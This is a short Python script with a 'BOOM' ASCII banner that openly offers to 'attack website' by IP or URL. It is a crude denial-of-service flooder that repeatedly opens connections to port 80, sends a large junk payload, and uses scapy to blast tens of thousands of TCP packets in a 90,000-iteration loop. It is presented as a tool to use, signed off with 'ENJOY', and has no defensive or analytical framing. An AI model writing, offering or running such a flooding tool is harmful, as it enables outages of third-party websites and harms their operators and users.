#!/usr/bin/env python3
from socket import  AF_INET,SOCK_STREAM
from scapy.all import *


print ('''   	
 $$$$$$$\  $$$$$$\  $$$$$$\ $$\      $$\ 
$$  __$$\$$  __$$\$$  __$$\$$$\    $$$ |
$$ |  $$ $$ /  $$ $$ /  $$ $$$$\  $$$$ |
$$$$$$$\ $$ |  $$ $$ |  $$ $$\$$\$$ $$ |
$$  __$$\$$ |  $$ $$ |  $$ $$ \$$$  $$ |
$$ |  $$ $$ |  $$ $$ |  $$ $$ |\$  /$$ |
$$$$$$$  |$$$$$$  |$$$$$$  $$ | \_/ $$ |
\_______/ \______/ \______/\__|     \__|
                                                                                                                                                 
for using it ::
>>>>>>>>>>>>>>>>>>>>>>>	
chosse :
if you want to attack website with ip
[1]write >>  ip

then ;
enter the ip of website
-----------------------
if you want to attack site with url

[2]write >>  url
then;
enter the url of website

ENJOY ........''')

def doss (url):
	s = socket.socket(AF_INET,SOCK_STREAM)
	ip= socket.gethostbyname(url)
	s.connect((ip,80))
	data =b'QAZWSXEDCRFVTGBYHNUJMIK,OL.P;/qazwsxedcrfvtgbyhnujmik,ol.p;1@3#$%$^57^%657'*10000
	send(IP(dst=ip)/TCP(dport=80),count=90000)
	s.send(data)


x = input ('[1] ip    $$     [2] url  :: ')
if x == 'ip':
	ip = input ('enter the ip of site :>> ')
	for i in range (90000):
		doss(ip)

else:
	url = input('enter the url of site :>> ')
	for i in range (90000):
		doss(url)
